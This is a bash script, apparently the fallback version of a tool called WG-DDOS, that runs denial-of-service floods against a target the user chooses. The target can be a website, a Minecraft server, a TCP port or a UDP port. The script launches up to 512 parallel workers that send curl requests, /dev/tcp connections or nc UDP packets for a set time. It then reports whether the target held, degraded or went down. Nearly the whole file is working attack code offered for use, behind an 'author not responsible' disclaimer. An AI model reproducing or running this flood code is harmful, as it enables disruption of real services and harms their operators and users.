#!/usr/bin/env bash
# WG-DDOS bash fallback - by whitiger
# https://github.com/whitigerxgaming-design/WG-DDOS
# Lighter than the python version. AS IS, no warranty.
# The author is NOT responsible for any target. See DISCLAIMER.md.
set -uo pipefail

GREEN='\033[0;32m'; YEL='\033[0;33m'; RED='\033[0;31m'; NC='\033[0m'

echo "=============================================="
echo " WG-DDOS (bash fallback)  -  by whitiger"
echo " AS IS, no warranty. Author not responsible."
echo "=============================================="

if [ -x ./panel.py ]; then
  echo
  echo " The full python panel is installed."
  echo " Run ./panel.py for the real thing, or press Enter to"
  echo " continue with the bash fallback."
  read -r _
fi

echo
echo " What are you attacking?"
echo "  1) Website"
echo "  2) Minecraft server"
echo "  3) TCP port"
echo "  4) UDP port"
printf " Choice [1-4]: "
read -r CHOICE

case "$CHOICE" in
  1) MODE="http"; printf " URL (e.g. https://example.com): "; read -r TARGET; PORT=0 ;;
  2) MODE="minecraft"; printf " Server host or IP: "; read -r TARGET
     printf " Port [25565]: "; read -r PORT; PORT="${PORT:-25565}" ;;
  3) MODE="tcp"; printf " Host or IP: "; read -r TARGET
     printf " Port [80]: "; read -r PORT; PORT="${PORT:-80}" ;;
  4) MODE="udp"; printf " Host or IP: "; read -r TARGET
     printf " Port [53]: "; read -r PORT; PORT="${PORT:-53}" ;;
  *) echo " bad choice"; exit 1 ;;
esac

printf " Duration in seconds [30]: "
read -r DURATION
DURATION="${DURATION:-30}"

CORES=$(nproc 2>/dev/null || echo 1)
RAM_GB=$(awk '/MemTotal/ {printf "%d", $2/1048576}' /proc/meminfo 2>/dev/null || echo 4)
WORKERS=$(( CORES * 32 ))
[ "$WORKERS" -gt 512 ] && WORKERS=512
[ "$WORKERS" -lt 8 ] && WORKERS=8

echo
echo "----------------------------------------------"
echo " Target   : $TARGET"
echo " Mode     : $MODE"
echo " Port     : $PORT"
echo " Duration : ${DURATION}s"
echo " Cores    : $CORES   RAM: ${RAM_GB}GB"
echo " Workers  : $WORKERS"
echo "----------------------------------------------"
echo " Ctrl+C stops early."
echo

START=$(date +%s)
END=$(( START + DURATION ))
export END

case "$MODE" in
  http)
    SEQ=$(yes 1 | head -n "$WORKERS" | xargs -P "$WORKERS" -I{} bash -c \
      'while [ "$(date +%s)" -lt "$END" ]; do C=$(curl -s -o /dev/null -w "%{http_code}" --max-time 8 "$0?_=$RANDOM$RANDOM" 2>/dev/null); [ -n "$C" ] && [ "$C" != "000" ] && echo ok || echo err; done' "$TARGET") ;;
  tcp|minecraft)
    SEQ=$(yes 1 | head -n "$WORKERS" | xargs -P "$WORKERS" -I{} bash -c \
      'while [ "$(date +%s)" -lt "$END" ]; do timeout 5 bash -c "echo > /dev/tcp/$0/$1" 2>/dev/null && echo ok || echo err; done' "$TARGET" "$PORT") ;;
  udp)
    SEQ=$(yes 1 | head -n "$WORKERS" | xargs -P "$WORKERS" -I{} bash -c \
      'while [ "$(date +%s)" -lt "$END" ]; do echo x | timeout 3 nc -u -w1 "$0" "$1" >/dev/null 2>&1 && echo ok || echo err; done' "$TARGET" "$PORT") ;;
esac

SENT=$(printf '%s\n' "$SEQ" | grep -c . )
OK=$(printf '%s\n' "$SEQ" | grep -c '^ok$' )
ERR=$(( SENT - OK ))
ELAPSED=$(( $(date +%s) - START ))
[ "$ELAPSED" -lt 1 ] && ELAPSED=1
RPS=$(( SENT / ELAPSED ))
if [ "$SENT" -gt 0 ]; then PCT=$(( ERR * 100 / SENT )); else PCT=0; fi

echo
echo "================ WG-DDOS REPORT ================"
echo " Target     : $TARGET:$PORT"
echo " Mode       : $MODE"
echo " Duration   : ${ELAPSED}s"
echo " Attempts   : $SENT"
echo " Succeeded  : $OK"
echo " Failed     : $ERR (${PCT}%)"
echo " Avg rate   : ${RPS}/s"
if [ "$PCT" -lt 10 ]; then
  echo " Verdict    : TARGET HELD"
elif [ "$PCT" -lt 50 ]; then
  echo " Verdict    : TARGET DEGRADED"
else
  echo " Verdict    : TARGET OVERWHELMED / DOWN"
fi
echo "==============================================="
echo " AS IS, no warranty. Author not responsible."
